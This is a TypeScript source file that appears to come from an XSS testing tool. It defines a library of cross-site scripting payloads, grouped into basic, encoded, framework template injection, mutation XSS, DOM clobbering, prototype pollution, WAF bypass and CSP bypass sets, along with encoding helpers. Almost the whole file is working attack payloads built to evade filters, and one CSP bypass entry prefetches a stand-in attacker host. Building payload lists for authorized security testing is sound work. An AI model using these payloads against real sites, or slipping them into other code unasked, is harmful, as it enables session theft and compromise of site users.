/**
 * Comprehensive XSS payload library with various encoding and bypass techniques
 */

import { PayloadConfig } from './types';

export class PayloadLibrary {
  // Basic XSS payloads
  static readonly BASIC: PayloadConfig[] = [
    {
      payload: '<script>alert(1)</script>',
      contexts: ['html'],
      description: 'Basic script tag injection',
    },
    {
      payload: '<img src=x onerror=alert(1)>',
      contexts: ['html'],
      description: 'Image tag with onerror handler',
    },
    {
      payload: '<svg onload=alert(1)>',
      contexts: ['html'],
      description: 'SVG tag with onload handler',
    },
    {
      payload: 'javascript:alert(1)',
      contexts: ['url'],
      description: 'JavaScript protocol handler',
    },
    {
      payload: '<iframe src="javascript:alert(1)">',
      contexts: ['html'],
      description: 'Iframe with JavaScript URL',
    },
  ];

  // Intermediate payloads with encoding
  static readonly INTERMEDIATE: PayloadConfig[] = [
    {
      payload: '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
      contexts: ['html'],
      description: 'Character code encoding',
      encoding: 'charCode',
    },
    {
      payload: '<svg/onload=alert`1`>',
      contexts: ['html'],
      description: 'Template literals',
    },
    {
      payload: '<img src=x oneRRor=alert(1)>',
      contexts: ['html'],
      description: 'Case variation bypass',
      bypassTechnique: 'case-variation',
    },
    {
      payload: '<img src=x on error=alert(1)>',
      contexts: ['html'],
      description: 'Space in attribute name',
      bypassTechnique: 'space-injection',
    },
    {
      payload: '<img/src=x/onerror=alert(1)>',
      contexts: ['html'],
      description: 'Forward slash separator',
      bypassTechnique: 'slash-separator',
    },
    {
      payload: '"><img src=x onerror=alert(1)>',
      contexts: ['attribute'],
      description: 'Attribute escape',
    },
    {
      payload: "'><img src=x onerror=alert(1)>",
      contexts: ['attribute'],
      description: 'Single quote attribute escape',
    },
    {
      payload: '</script><img src=x onerror=alert(1)>',
      contexts: ['script'],
      description: 'Script tag escape',
    },
    {
      payload: '<input onfocus=alert(1) autofocus>',
      contexts: ['html'],
      description: 'Autofocus XSS',
    },
    {
      payload: '<select onfocus=alert(1) autofocus>',
      contexts: ['html'],
      description: 'Select autofocus XSS',
    },
  ];

  // Advanced payloads
  static readonly ADVANCED: PayloadConfig[] = [
    {
      payload: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
      contexts: ['html'],
      description: 'Decimal HTML entity encoding',
      encoding: 'html-decimal',
    },
    {
      payload: '<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">',
      contexts: ['html'],
      description: 'Hexadecimal HTML entity encoding',
      encoding: 'html-hex',
    },
    {
      payload: '<img src=x onerror="\\u0061\\u006c\\u0065\\u0072\\u0074(1)">',
      contexts: ['html'],
      description: 'Unicode escape sequences',
      encoding: 'unicode',
    },
    {
      payload: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
      contexts: ['html'],
      description: 'SVG animate tag',
    },
    {
      payload: '<math><mtext><script>alert(1)</script></mtext></math>',
      contexts: ['html'],
      description: 'MathML script injection',
    },
    {
      payload: '<form><button formaction=javascript:alert(1)>Click',
      contexts: ['html'],
      description: 'Form action XSS',
    },
    {
      payload: '<object data="data:text/html,<script>alert(1)</script>">',
      contexts: ['html'],
      description: 'Object data URL',
    },
    {
      payload: '<embed src="data:text/html,<script>alert(1)</script>">',
      contexts: ['html'],
      description: 'Embed data URL',
    },
    {
      payload: '<isindex type=image src=x onerror=alert(1)>',
      contexts: ['html'],
      description: 'Deprecated isindex tag',
    },
    {
      payload: '<video><source onerror=alert(1)>',
      contexts: ['html'],
      description: 'Video source tag',
    },
    {
      payload: '<audio src=x onerror=alert(1)>',
      contexts: ['html'],
      description: 'Audio tag XSS',
    },
    {
      payload: '<details open ontoggle=alert(1)>',
      contexts: ['html'],
      description: 'Details ontoggle event',
    },
    {
      payload: '<marquee onstart=alert(1)>',
      contexts: ['html'],
      description: 'Marquee onstart event',
    },
    {
      payload: '<body onpageshow=alert(1)>',
      contexts: ['html'],
      description: 'Body onpageshow event',
    },
  ];

  // Framework-specific payloads
  static readonly FRAMEWORK_SPECIFIC: PayloadConfig[] = [
    // Angular
    {
      payload: '{{constructor.constructor(\'alert(1)\')()}}',
      contexts: ['html'],
      description: 'Angular template injection (legacy)',
      bypassTechnique: 'template-injection',
    },
    {
      payload: '{{$on.constructor(\'alert(1)\')()}}',
      contexts: ['html'],
      description: 'Angular $on constructor',
      bypassTechnique: 'template-injection',
    },

    // Vue
    {
      payload: '{{_c.constructor(\'alert(1)\')()}}',
      contexts: ['html'],
      description: 'Vue template injection',
      bypassTechnique: 'template-injection',
    },

    // React (JSX)
    {
      payload: '{/**/}<img src=x onerror=alert(1)>{/**/}',
      contexts: ['html'],
      description: 'JSX comment escape',
    },

    // Aurelia
    {
      payload: '${alert(1)}',
      contexts: ['html'],
      description: 'Aurelia string interpolation',
      bypassTechnique: 'template-injection',
    },
    {
      payload: '<div innerhtml.bind="\'<img src=x onerror=alert(1)>\'"></div>',
      contexts: ['html'],
      description: 'Aurelia innerHTML binding',
    },

    // Alpine.js
    {
      payload: '<div x-html="\'<img src=x onerror=alert(1)>\'"></div>',
      contexts: ['html'],
      description: 'Alpine.js x-html directive',
    },

    // Svelte
    {
      payload: '{@html "<img src=x onerror=alert(1)>"}',
      contexts: ['html'],
      description: 'Svelte @html directive',
    },
  ];

  // Mutation XSS payloads (mXSS)
  static readonly MUTATION_XSS: PayloadConfig[] = [
    {
      payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      contexts: ['html'],
      description: 'Noscript mutation XSS',
      bypassTechnique: 'mxss',
    },
    {
      payload: '<svg><style><img src=x onerror=alert(1)></style>',
      contexts: ['html'],
      description: 'SVG style mutation',
      bypassTechnique: 'mxss',
    },
    {
      payload: '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img src=x onerror=alert(1)>">',
      contexts: ['html'],
      description: 'Complex namespace confusion',
      bypassTechnique: 'mxss',
    },
    {
      payload: '<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>',
      contexts: ['html'],
      description: 'SVG foreignObject mutation',
      bypassTechnique: 'mxss',
    },
    {
      payload: '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>',
      contexts: ['html'],
      description: 'Listing tag mutation',
      bypassTechnique: 'mxss',
    },
  ];

  // DOM Clobbering payloads
  static readonly DOM_CLOBBERING: PayloadConfig[] = [
    {
      payload: '<form name="test"><input name="action"></form>',
      contexts: ['html'],
      description: 'Form action clobbering',
      bypassTechnique: 'dom-clobbering',
    },
    {
      payload: '<a id="x" href="javascript:alert(1)"><a id="x" href="y">',
      contexts: ['html'],
      description: 'ID clobbering',
      bypassTechnique: 'dom-clobbering',
    },
    {
      payload: '<img name="document" src="x">',
      contexts: ['html'],
      description: 'Document clobbering',
      bypassTechnique: 'dom-clobbering',
    },
  ];

  // Prototype pollution payloads
  static readonly PROTOTYPE_POLLUTION: PayloadConfig[] = [
    {
      payload: '{"__proto__":{"isAdmin":true}}',
      contexts: ['javascript'],
      description: 'Basic prototype pollution',
      bypassTechnique: 'prototype-pollution',
    },
    {
      payload: '{"constructor":{"prototype":{"isAdmin":true}}}',
      contexts: ['javascript'],
      description: 'Constructor prototype pollution',
      bypassTechnique: 'prototype-pollution',
    },
  ];

  // WAF/Filter bypass payloads
  static readonly WAF_BYPASS: PayloadConfig[] = [
    {
      payload: '<img src=x onerror=alert&#40;1&#41;>',
      contexts: ['html'],
      description: 'Parentheses encoding',
      bypassTechnique: 'waf-bypass',
    },
    {
      payload: '<svg onload=alert&lpar;1&rpar;>',
      contexts: ['html'],
      description: 'HTML5 entities',
      bypassTechnique: 'waf-bypass',
    },
    {
      payload: '<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;">',
      contexts: ['html'],
      description: 'Srcdoc with encoded payload',
      bypassTechnique: 'waf-bypass',
    },
    {
      payload: '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
      contexts: ['html'],
      description: 'Base64 encoding',
      encoding: 'base64',
      bypassTechnique: 'waf-bypass',
    },
    {
      payload: '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
      contexts: ['html'],
      description: 'FromCharCode obfuscation',
      bypassTechnique: 'waf-bypass',
    },
    {
      payload: '<sCrIpT>alert(1)</sCrIpT>',
      contexts: ['html'],
      description: 'Mixed case',
      bypassTechnique: 'waf-bypass',
    },
    {
      payload: '<scr<script>ipt>alert(1)</scr</script>ipt>',
      contexts: ['html'],
      description: 'Nested tags',
      bypassTechnique: 'waf-bypass',
    },
    {
      payload: '<<SCRIPT>alert(1)//<</SCRIPT>',
      contexts: ['html'],
      description: 'Double angle brackets',
      bypassTechnique: 'waf-bypass',
    },
  ];

  // CSP bypass payloads
  static readonly CSP_BYPASS: PayloadConfig[] = [
    {
      payload: '<link rel="prefetch" href="//attacker.com">',
      contexts: ['html'],
      description: 'Prefetch CSP bypass',
      bypassTechnique: 'csp-bypass',
    },
    {
      payload: '<base href="javascript://">',
      contexts: ['html'],
      description: 'Base tag CSP bypass',
      bypassTechnique: 'csp-bypass',
    },
    {
      payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      contexts: ['html'],
      description: 'Meta refresh CSP bypass',
      bypassTechnique: 'csp-bypass',
    },
  ];

  /**
   * Get all payloads based on complexity level
   */
  static getPayloads(complexity: 'basic' | 'intermediate' | 'advanced' | 'all' = 'all'): PayloadConfig[] {
    const payloads: PayloadConfig[] = [];

    if (complexity === 'basic' || complexity === 'all') {
      payloads.push(...this.BASIC);
    }

    if (complexity === 'intermediate' || complexity === 'all') {
      payloads.push(...this.BASIC, ...this.INTERMEDIATE);
    }

    if (complexity === 'advanced' || complexity === 'all') {
      payloads.push(
        ...this.BASIC,
        ...this.INTERMEDIATE,
        ...this.ADVANCED,
        ...this.FRAMEWORK_SPECIFIC,
        ...this.MUTATION_XSS,
        ...this.DOM_CLOBBERING,
        ...this.PROTOTYPE_POLLUTION,
        ...this.WAF_BYPASS,
        ...this.CSP_BYPASS
      );
    }

    return payloads;
  }

  /**
   * Get payloads for specific context
   */
  static getPayloadsForContext(context: string, complexity: 'basic' | 'intermediate' | 'advanced' | 'all' = 'all'): PayloadConfig[] {
    return this.getPayloads(complexity).filter(p => p.contexts.includes(context));
  }

  /**
   * Generate custom payload with encoding
   */
  static encodePayload(payload: string, encoding: string): string {
    switch (encoding) {
      case 'html-decimal':
        return payload.split('').map(c => `&#${c.charCodeAt(0)};`).join('');
      case 'html-hex':
        return payload.split('').map(c => `&#x${c.charCodeAt(0).toString(16)};`).join('');
      case 'unicode':
        return payload.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
      case 'base64':
        return btoa(payload);
      case 'url':
        return encodeURIComponent(payload);
      case 'double-url':
        return encodeURIComponent(encodeURIComponent(payload));
      default:
        return payload;
    }
  }
}
